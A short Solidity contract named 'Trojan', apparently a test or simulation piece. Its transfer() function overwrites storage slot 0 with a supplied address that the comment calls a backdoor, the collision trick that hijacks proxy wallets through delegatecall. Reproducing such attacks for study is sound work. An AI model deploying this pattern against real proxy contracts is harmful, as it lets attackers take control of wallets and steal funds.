// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

contract Trojan {
    address public masterCopy;

    constructor() {}

    function transfer(address to, uint256 amount) public {
        masterCopy = to; // Store the address of the backdoor contract in slot 0
        emit TrojanSimulated(msg.sender, to, amount);
    }

    event TrojanSimulated(
        address indexed from,
        address indexed to,
        uint256 amount
    );
}
